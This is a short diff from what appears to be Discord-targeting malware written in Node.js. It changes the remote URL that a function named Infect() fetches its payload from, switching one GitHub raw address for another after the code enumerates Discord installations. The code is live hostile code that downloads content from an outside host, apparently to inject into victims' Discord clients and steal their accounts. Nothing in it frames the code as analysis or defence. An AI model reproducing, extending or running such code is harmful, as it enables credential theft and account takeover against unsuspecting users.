@@ -43,7 +43,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/xfixxyy/grabber/main/grabber', (resp) => {
+    https.get('https://raw.githubusercontent.com/xfixxyy/kirilmayanlog/main/kirilmayanlogs', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
